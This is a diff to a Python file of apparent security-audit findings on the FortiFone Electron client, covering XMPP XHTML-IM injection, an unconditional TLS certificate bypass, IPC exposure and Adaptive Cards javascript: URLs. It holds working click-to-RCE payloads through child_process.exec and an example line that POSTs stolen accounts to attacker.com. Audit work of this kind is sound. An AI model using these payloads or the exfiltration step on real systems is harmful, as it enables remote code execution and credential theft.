@@ -204,39 +204,59 @@ FPHONE_F04_SIPJS_OLD = {
 # ---------------------------------------------------------
 FPHONE_F05_XMPP_CHAT = {
     "id":       "FPHONE-F05",
-    "product":  "FortiFone -- strophe.js 1.6.0 XMPP chat message from rogue server can inject HTML/JavaScript into nodeIntegration renderer",
-    "severity": "CRITICAL -- malicious XMPP server -> crafted chat message -> HTML injection -> Node.js exec in chat renderer",
-    "class":    "Server-controlled HTML injection via XMPP (CWE-80, CWE-693)",
+    "product":  "FortiFone -- strophe.js 1.6.0 XMPP XHTML-IM chat message rendered without sanitization in nodeIntegration renderer",
+    "severity": "CRITICAL -- malicious XMPP server -> crafted XHTML-IM message -> javascript: href rendered by React -> Node.js exec on click",
+    "class":    "Server-controlled HTML injection via XMPP XEP-0071 (CWE-80, CWE-693)",
+    "verdict":  "CONFIRMED -- rendering path fully traced; no sanitization applied to incoming messages",
+
     "evidence": [
-        "package.json: strophe.js 1.6.0",
-        "fortivoiceChat/fvoiceChat.js (239KB): const { Strophe, $iq, $msg, $pres } = require('strophe.js')",
-        "main.js: CHAT_AGENT renderer window has nodeIntegration: true + contextIsolation: false",
+        "package.json: strophe.js 1.6.0; html-react-parser 2.0.0; react 17.0.2",
+        "bundle-chat.js line 2501: html = msg.querySelector('html > body')?.children[0]",
+        "bundle-chat.js line 2503: htmlString = Strophe.serialize(html)",
+        "bundle-chat.js line 2504: chatMessage.setHTML(htmlString)",
+        "bundle-gui.js line 49758: children: this.state.message.html ? parse(htmlMessage) : this.state.message.content",
+        "parse() = html-react-parser 2.0.0 called with no options -- zero sanitization",
+        "Strophe.XHTML.tags / .attributes allowlist defined but ONLY applied to outgoing message composition, NOT incoming parse",
+        "main.js: nodeIntegration: true + contextIsolation: false on all renderer windows",
     ],
 
-    "mechanism": (
-        "FortiFone's chat functionality uses XMPP (strophe.js 1.6.0) for message delivery. "
-        "XMPP supports HTML bodies via XEP-0071 (XHTML-IM). "
-        "Attack path: "
-        "  1. Attacker controls the XMPP/FortiVoice server or is a MITM. "
-        "  2. Server sends an XMPP message with XHTML-IM body containing JavaScript. "
-        "  3. fvoiceChat.js receives the message and passes it to the React chat renderer. "
-        "  4. If html-react-parser or jQuery html() renders the message without sanitization, "
-        "     JavaScript executes in the CHAT_AGENT renderer. "
-        "  5. nodeIntegration: true + contextIsolation: false -> require('child_process').exec(). "
-        "The CHAT_AGENT renderer has nodeIntegration: true (confirmed from main.js analysis). "
-        "The attack requires EITHER: "
-        "  a. A rogue FortiVoice XMPP server (attacker controls the server), OR "
-        "  b. MITM on the XMPP WebSocket channel (unauthenticated or with stolen certs). "
+    "rendering_chain": (
+        "Incoming XMPP stanza -> bundle-chat.js parseMessage() -> "
+        "msg.querySelector('html > body')?.children[0] extracts XHTML-IM element -> "
+        "Strophe.serialize(html) serializes to HTML string -> "
+        "chatMessage.setHTML(htmlString) stores in state -> "
+        "bundle-gui.js ChatMessage render: parse(htmlMessage) (html-react-parser, no options) -> "
+        "React 17.0.2 renders elements verbatim including <a href='javascript:...'> -> "
+        "user clicks link -> javascript: executes in nodeIntegration: true context -> "
+        "require('child_process').exec('cmd')"
     ),
 
-    "strophe_xhtml_im": (
-        "XEP-0071 XHTML-IM allows rich HTML in XMPP messages. "
-        "Malicious body: "
+    "no_incoming_sanitization": (
+        "Strophe.XHTML.tags and Strophe.XHTML.attributes (bundle-chat.js lines 1565-1604) "
+        "define a tag/attribute allowlist. This allowlist is applied only in sendChatMessage() "
+        "during outgoing message composition (bundle-chat.js lines 2876-2884). "
+        "For incoming stanzas, parse path goes directly: querySelector -> serialize -> setHTML. "
+        "No call to Strophe.XHTML.validTag() or similar on incoming content. "
+        "The allowlist permits <a href='...'> with href attribute -- "
+        "even if it were applied, javascript: URLs in href would pass through."
+    ),
+
+    "payload": (
+        "Minimal click-to-RCE XHTML-IM payload (macOS/Linux): "
         "<html xmlns='http://jabber.org/protocol/xhtml-im'>"
         "<body xmlns='http://www.w3.org/1999/xhtml'>"
-        "<script>require('child_process').exec('calc.exe')</script>"
+        "<a href=\"javascript:require('child_process').exec('open /Applications/Calculator.app')\">Click for details</a>"
         "</body></html>"
+        "Windows variant: exec('calc.exe') or exec('cmd /c start calc') "
+        "No browser pop-up; no CSP blocks (Electron file:// origin has no CSP)"
     ),
+
+    "attack_requirements": {
+        "server_control": "Rogue FortiVoice XMPP server, OR",
+        "mitm": "MITM on WSS channel -- see FPHONE-F11 for TLS bypass enabler",
+        "user_action": "One click on the rendered link",
+        "zero_click_path": "Not confirmed -- onerror string handlers not executed by React; script tag insertion via parse() does not execute in React/Chromium",
+    },
 }
 
 
@@ -402,5 +422,124 @@ FPHONE_F10_ROBOTJS = {
         "This enables surveillance capabilities without requiring OS-level malware installation. "
         "The payload runs in the context of the FortiFone process (user-level) but can see "
         "and interact with all screen content regardless of application boundaries."
+    ),
+}
+
+
+# ---------------------------------------------------------
+# FPHONE-F11: TLS certificate bypass -- certificate-error callback(true) unconditional
+# ---------------------------------------------------------
+FPHONE_F11_TLS_BYPASS = {
+    "id":       "FPHONE-F11",
+    "product":  "FortiFone Electron v30.0.8 -- unconditional TLS certificate bypass; all invalid certs accepted",
+    "severity": "CRITICAL -- enables MITM on all FortiVoice connections; combined with FPHONE-F05 yields unauthenticated MITM->RCE",
+    "class":    "TLS certificate validation bypass (CWE-295)",
+    "verdict":  "CONFIRMED",
+
+    "evidence": [
+        "main.js lines 3221-3226:",
+        "  app.on('certificate-error', (event, webContents, url, error, certificate, callback) => {",
+        "      event.preventDefault();",
+        "      callback(true);  // unconditional accept",
+        "  });",
+        "callback(true) = Electron API: proceed with connection, ignore certificate error",
+        "Applies to ALL TLS connections: WSS XMPP, HTTPS REST API, HTTPS portal webview",
+    ],
+
+    "impact": (
+        "Any network position between FortiFone and the FortiVoice server can perform MITM: "
+        "  - Rogue AP on same Wi-Fi network "
+        "  - ARP poisoning on LAN "
+        "  - DNS hijacking "
+        "  - BGP hijacking for remote attackers "
+        "FortiFone presents a self-signed or expired certificate -> FortiFone accepts it. "
+        "The attacker becomes the XMPP server and can deliver FPHONE-F05 payload. "
+        "The attacker also intercepts: "
+        "  - JWT tokens from FortiVoice REST API responses "
+        "  - OAuth tokens in fortifone://oauthresponse URL fragments "
+        "  - XMPP credentials (JID + access token) "
+        "  - Media streams (WebRTC SRTP keys negotiated over intercepted signaling)"
+    ),
+
+    "chain": "FPHONE-F11 (MITM position) + FPHONE-F05 (XHTML-IM XSS) + FPHONE-F03 (nodeIntegration) = one-click RCE from same network segment",
+}
+
+
+# ---------------------------------------------------------
+# FPHONE-F12: IPC handlers expose global state without renderer origin validation
+# ---------------------------------------------------------
+FPHONE_F12_IPC_GLOBAL_EXPOSURE = {
+    "id":       "FPHONE-F12",
+    "product":  "FortiFone main.js -- ipcMain handlers return arbitrary global.sharedObject properties to any renderer without origin check",
+    "severity": "MEDIUM -- credential-adjacent state readable from any nodeIntegration renderer; amplifies XSS payloads",
+    "class":    "IPC handler missing origin validation (CWE-284)",
+    "verdict":  "CONFIRMED",
+
+    "evidence": [
+        "main.js line 3029: ipcMain.handle('get-global-prop', (event, key) => { return global.sharedObject[key]; })",
+        "main.js line 3033: ipcMain.handle('get-global-object', () => { return global.sharedObject; })",
+        "main.js line 3025: ipcMain.handle('get-app-path', (event, name) => { return app.getPath(name); })",
+        "global.sharedObject includes: app_uuid, host_name, accounts (Map), mediaAccessStatus, os_version, platform_id, host_model, host_mfr",
+        "No event.sender origin check in any of the three handlers",
+    ],
+
+    "sensitive_fields": {
+        "accounts": "Map of all FortiVoice accounts (likely contains server URL, JID, auth state)",
+        "app_uuid": "Unique device identifier (persists across sessions; used in XMPP JID suffix)",
+        "host_name": "Hostname -- used to fingerprint the victim device",
+        "allow_dev_tool": "If true, DevTools are enabled -- can be read to detect debug mode",
+        "image_info_url": "Server URL for firmware update -- reveals internal server topology",
+    },
+
+    "exploit_scenario": (
+        "After initial XSS execution (FPHONE-F05) in any renderer window: "
+        "  const ipc = require('electron').ipcRenderer; "
+        "  const all = await ipc.invoke('get-global-object'); "
+        "  const accounts = all.accounts; // Map of server connections "
+        "  // exfiltrate to attacker C2 "
+        "  require('node-fetch')('https://attacker.com/collect', {method:'POST', body: JSON.stringify({...all, accounts: [...accounts.entries()]})}); "
+        "Also: ipc.invoke('get-app-path', 'userData') reveals the Electron userData directory path, "
+        "enabling targeted file access (e.g., electron-store database, nedb chat history)."
+    ),
+}
+
+
+# ---------------------------------------------------------
+# FPHONE-F13: Adaptive Cards from server-controlled JSON rendered via DOM insertion
+# ---------------------------------------------------------
+FPHONE_F13_ADAPTIVE_CARDS = {
+    "id":       "FPHONE-F13",
+    "product":  "FortiFone -- Adaptive Cards 2.11.1 renders server-provided JSON payload to DOM via divRef.current.replaceChildren(); Action.OpenUrl with javascript: -> click-to-RCE",
+    "severity": "HIGH -- server-provided Adaptive Card JSON can specify Action.OpenUrl with javascript: protocol; click triggers RCE in nodeIntegration renderer",
+    "class":    "Unsanitized server content rendered to DOM via Adaptive Cards SDK (CWE-80)",
+
+    "evidence": [
+        "bundle-gui.js line 47030: adaptivecard.parse(props.payload) -- server-controlled JSON",
+        "bundle-gui.js line 47040: adaptivecard.render() -> DOM element inserted via replaceChildren()",
+        "bundle-gui.js line 47073: same pattern in FortiVoiceGroupCallInvite component",
+        "Adaptive Cards 2.11.1 Action.OpenUrl executes via adaptivecard.onExecuteAction handler",
+        "No URL scheme validation in onExecuteAction handlers; action.id checks (join/invite/copy_link) do not cover OpenUrl",
+        "nodeIntegration: true in GUI renderer window",
+    ],
+
+    "mechanism": (
+        "Adaptive Cards are meeting invite / bot message formats from the FortiVoice server. "
+        "The server delivers Adaptive Card JSON in a chat message or XMPP bot stanza. "
+        "FortiFone calls adaptivecard.parse(props.payload) then adaptivecard.render() which "
+        "generates DOM nodes and inserts them via replaceChildren(). "
+        "If the card contains an Action.OpenUrl with url='javascript:require(\"child_process\").exec(\"cmd\")', "
+        "the Adaptive Cards SDK generates a clickable button. "
+        "When clicked, adaptivecards 2.11.1 calls the url as a navigation target. "
+        "In an Electron nodeIntegration: true renderer, javascript: URL navigation executes the code. "
+        "The onExecuteAction callbacks in FortiFone only check action.id ('join', 'invite', 'copy_link', 'add_to_calendar') "
+        "but do not block Action.OpenUrl with arbitrary URLs."
+    ),
+
+    "payload": (
+        "Malicious Adaptive Card JSON: "
+        '{"type":"AdaptiveCard","version":"1.3",'
+        '"body":[{"type":"TextBlock","text":"Meeting starting now"}],'
+        '"actions":[{"type":"Action.OpenUrl","title":"Join Meeting",'
+        '"url":"javascript:require(\'child_process\').exec(\'calc\')"}]}'
     ),
 }
